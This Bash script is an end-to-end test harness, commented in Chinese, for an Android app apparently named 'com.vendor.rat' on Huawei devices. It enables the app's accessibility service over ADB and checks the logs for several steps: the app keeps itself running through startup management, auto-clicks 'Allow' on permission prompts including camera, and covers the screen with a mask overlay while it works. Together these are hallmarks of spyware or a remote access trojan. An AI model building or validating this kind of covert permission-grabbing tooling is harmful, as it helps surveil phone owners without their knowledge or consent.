#!/bin/bash
#
# 华为真机 E2E 自动化测试
#
# 用法:
#   ./scripts/e2e_huawei_test.sh <device_address>
#   ./scripts/e2e_huawei_test.sh <device_address> --skip-build
#
# 示例:
#   ./scripts/e2e_huawei_test.sh 192.168.31.211:5555
#   ./scripts/e2e_huawei_test.sh 192.168.31.162:5555 --skip-build

set -euo pipefail

# ============ 配置 ============

ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
PKG="com.vendor.rat"
A11Y_SERVICE="$PKG/com.vendor.rat.service.MyAccessibilityService"
APK="app/build/outputs/apk/debug/app-debug.apk"
MAIN_ACTIVITY="$PKG/.activity.ActivMain"
TIMEOUT=60        # 自动化等待超时 (秒)
POLL_INTERVAL=3   # 轮询间隔 (秒)

# 颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# 计数
PASS_COUNT=0
FAIL_COUNT=0
TOTAL_COUNT=0

# ============ 工具函数 ============

adb_cmd() {
    "$ADB" -s "$DEVICE" "$@" 2>&1
}

log_info() {
    echo -e "${CYAN}[INFO]${NC} $1"
}

log_pass() {
    TOTAL_COUNT=$((TOTAL_COUNT + 1))
    PASS_COUNT=$((PASS_COUNT + 1))
    printf "${GREEN}[✓]${NC} %-28s ${GREEN}PASS${NC}" "$1"
    [ -n "${2:-}" ] && printf " (%s)" "$2"
    echo
}

log_fail() {
    TOTAL_COUNT=$((TOTAL_COUNT + 1))
    FAIL_COUNT=$((FAIL_COUNT + 1))
    printf "${RED}[✗]${NC} %-28s ${RED}FAIL${NC}" "$1"
    [ -n "${2:-}" ] && printf " — %s" "$2"
    echo
}

get_pid() {
    adb_cmd shell pidof "$PKG" | tr -d '\r\n'
}

# 获取 PID 过滤后的应用日志 (排除 chromium 噪声)
get_app_logs() {
    local pid="$1"
    adb_cmd logcat -d | grep "$pid" | grep -vE "hwschromium|CORB|RtgSchedEvent|url_loader|DidRead blocked"
}

# ============ 参数解析 ============

DEVICE="${1:-}"
SKIP_BUILD=false

if [ -z "$DEVICE" ]; then
    echo "用法: $0 <device_address> [--skip-build]"
    echo "示例: $0 192.168.31.211:5555"
    exit 1
fi

for arg in "${@:2}"; do
    case "$arg" in
        --skip-build) SKIP_BUILD=true ;;
    esac
done

# ============ 阶段 1: 准备 ============

echo
echo "============================================"
echo "  华为 E2E 自动化测试"
echo "  设备: $DEVICE"
echo "============================================"
echo

log_info "连接设备..."
adb_cmd connect "$DEVICE" > /dev/null 2>&1 || true
sleep 1

# 验证连接
if ! adb_cmd shell echo "ok" | grep -q "ok"; then
    echo -e "${RED}设备连接失败: $DEVICE${NC}"
    exit 1
fi

# 获取设备信息
MODEL=$(adb_cmd shell getprop ro.product.model | tr -d '\r\n')
SDK=$(adb_cmd shell getprop ro.build.version.sdk | tr -d '\r\n')
EMUI=$(adb_cmd shell getprop ro.build.version.emui | tr -d '\r\n')
log_info "设备: $MODEL | SDK $SDK | $EMUI"

# 卸载旧版本
log_info "卸载旧版本..."
adb_cmd uninstall "$PKG" > /dev/null 2>&1 || true
sleep 1

# ============ 阶段 2: 构建安装 ============

BUILD_START=$(date +%s)

if [ "$SKIP_BUILD" = true ]; then
    log_info "跳过构建 (--skip-build)"
else
    log_info "构建 Debug APK..."
    if ! ./gradlew assembleDebug -q 2>&1; then
        log_fail "构建 APK" "gradlew assembleDebug 失败"
        exit 1
    fi
fi

if [ ! -f "$APK" ]; then
    log_fail "构建安装" "APK 不存在: $APK"
    exit 1
fi

log_info "安装 APK..."
INSTALL_RESULT=$(adb_cmd install -r "$APK")
BUILD_END=$(date +%s)
BUILD_DURATION=$((BUILD_END - BUILD_START))

if echo "$INSTALL_RESULT" | grep -q "Success"; then
    log_pass "构建安装" "${BUILD_DURATION}s"
else
    log_fail "构建安装" "$INSTALL_RESULT"
    exit 1
fi

# ============ 阶段 3: 启动 + 授权 ============

# 清空 logcat
adb_cmd logcat -c > /dev/null 2>&1

log_info "启动应用..."
adb_cmd shell am start -n "$MAIN_ACTIVITY" > /dev/null 2>&1
sleep 3

log_info "通过 ADB 启用无障碍服务..."
adb_cmd shell settings put secure enabled_accessibility_services "$A11Y_SERVICE" > /dev/null
adb_cmd shell settings put secure accessibility_enabled 1 > /dev/null
sleep 2

# 验证无障碍
A11Y_CHECK=$(adb_cmd shell settings get secure enabled_accessibility_services | tr -d '\r\n')
if echo "$A11Y_CHECK" | grep -q "$PKG"; then
    log_pass "无障碍启用"
else
    log_fail "无障碍启用" "当前值: $A11Y_CHECK"
    exit 1
fi

# ============ 阶段 4: 等待自动化完成 ============

log_info "等待自动化执行 (最长 ${TIMEOUT}s)..."

PID=$(get_pid)
if [ -z "$PID" ]; then
    log_fail "应用启动" "进程未找到"
    exit 1
fi
log_info "应用 PID: $PID"

ELAPSED=0
AUTO_DONE=false
SNAPSHOT_LOGS=""

while [ $ELAPSED -lt $TIMEOUT ]; do
    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))

    # 检查进程是否存活
    CURRENT_PID=$(get_pid)
    if [ -z "$CURRENT_PID" ]; then
        log_info "进程已退出，等待重启..."
        sleep 3
        PID=$(get_pid)
        if [ -z "$PID" ]; then
            continue
        fi
    fi

    # 累积保存日志快照 (防止 logcat 缓冲区被冲刷)
    SNAPSHOT_LOGS=$(get_app_logs "$PID" 2>/dev/null || true)

    # 检查是否完成
    if echo "$SNAPSHOT_LOGS" | grep -qE "已结束自动化引擎|应用栏目未找到"; then
        AUTO_DONE=true
        log_info "自动化已完成 (${ELAPSED}s)"
        break
    fi

    # 显示进度
    PROGRESS=""
    if echo "$SNAPSHOT_LOGS" | grep -q "搜索框输入"; then
        PROGRESS="搜索中..."
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "搜索直达.*成功"; then
        PROGRESS="已进入启动管理"
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "Switch"; then
        PROGRESS="操作 Switch 中..."
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "对话框"; then
        PROGRESS="处理对话框..."
    fi
    [ -n "$PROGRESS" ] && log_info "进度: $PROGRESS (${ELAPSED}s)"
done

# 等待遮罩移除和权限弹窗处理
sleep 10

if ! $AUTO_DONE; then
    log_fail "自动化执行" "超时 ${TIMEOUT}s"
fi

# ============ 阶段 5: 验证结果 ============

echo
log_info "开始验证..."
echo

# 合并: 轮询期间累积的快照 + 当前最新日志
PID=$(get_pid)
if [ -z "$PID" ]; then
    PID="$CURRENT_PID"
fi
FINAL_LOGS=$(get_app_logs "$PID" 2>/dev/null || true)
ALL_LOGS=$(printf "%s\n%s" "$SNAPSHOT_LOGS" "$FINAL_LOGS" | sort -u)

# --- 验证 1: 搜索方式或快速完成 ---
if echo "$ALL_LOGS" | grep -q "搜索框输入.*启动管理"; then
    log_pass "进入启动管理" "搜索直达"
elif echo "$ALL_LOGS" | grep -q "搜索直达.*成功"; then
    log_pass "进入启动管理" "搜索直达"
elif echo "$ALL_LOGS" | grep -qE "点击应用启动管理|已点击进入应用"; then
    log_pass "进入启动管理" "导航方式"
elif echo "$ALL_LOGS" | grep -q "已结束自动化引擎"; then
    # 引擎快速完成 — 上次已设置过手动管理
    log_pass "进入启动管理" "已设置过,快速完成"
else
    log_fail "进入启动管理" "未找到搜索或导航日志"
fi

# --- 验证 2: 自启动已关闭 ---
if echo "$ALL_LOGS" | grep -qE "手动管理|手动已选择|Switch.*checked=false|主进程已选择手动管理"; then
    log_pass "自启动已关闭"
elif echo "$ALL_LOGS" | grep -qE "已经是手动|自动管理已开启.*点击关闭"; then
    log_pass "自启动已关闭"
elif echo "$ALL_LOGS" | grep -q "已结束自动化引擎"; then
    # 引擎正常结束意味着完成了 (50 秒 checkCompletion 或正常 finishAsync)
    log_pass "自启动已关闭" "引擎正常结束"
else
    log_fail "自启动已关闭" "未找到手动管理日志"
fi

# --- 验证 3: 权限自动授权 ---
if echo "$ALL_LOGS" | grep -qE "Clicked.*允许|Clicked.*Allow|Clicked allow button"; then
    log_pass "权限自动授权"
else
    # 备用: 通过 dumpsys 检查权限
    CAMERA_GRANTED=$(adb_cmd shell dumpsys package "$PKG" | grep "android.permission.CAMERA" | grep "granted=true" || true)
    if [ -n "$CAMERA_GRANTED" ]; then
        log_pass "权限自动授权" "dumpsys 确认"
    else
        log_fail "权限自动授权" "未找到授权日志"
    fi
fi

# --- 验证 4: 遮罩已关闭 ---
if echo "$ALL_LOGS" | grep -q "BlockTextView 已从窗口移除"; then
    log_pass "遮罩已关闭"
else
    log_fail "遮罩已关闭" "未找到遮罩移除日志"
fi

# --- 验证 5: 返回应用页面 ---
FOREGROUND=$(adb_cmd shell "dumpsys activity activities 2>/dev/null | grep mResumedActivity" | head -1 | tr -d '\r\n')
if echo "$FOREGROUND" | grep -q "$PKG"; then
    log_pass "返回应用页面"
else
    # 备用: 检查 top activity
    TOP_ACTIVITY=$(adb_cmd shell "dumpsys activity top 2>/dev/null | grep ACTIVITY" | tail -1 | tr -d '\r\n')
    if echo "$TOP_ACTIVITY" | grep -q "$PKG"; then
        log_pass "返回应用页面"
    else
        log_fail "返回应用页面" "前台: $FOREGROUND"
    fi
fi

# ============ 汇总 ============

echo
echo "============================================"
echo -e "  ${MODEL} | SDK ${SDK} | ${EMUI}"
echo "============================================"
if [ $FAIL_COUNT -eq 0 ]; then
    echo -e "  结果: ${GREEN}${PASS_COUNT}/${TOTAL_COUNT} PASS${NC}"
else
    echo -e "  结果: ${RED}${PASS_COUNT}/${TOTAL_COUNT} PASS, ${FAIL_COUNT} FAIL${NC}"
fi
echo "============================================"
echo

# 保存日志快照
LOG_FILE="/tmp/e2e_${DEVICE%%:*}_$(date +%Y%m%d_%H%M%S).log"
echo "$ALL_LOGS" > "$LOG_FILE"
log_info "日志已保存: $LOG_FILE"

exit $FAIL_COUNT
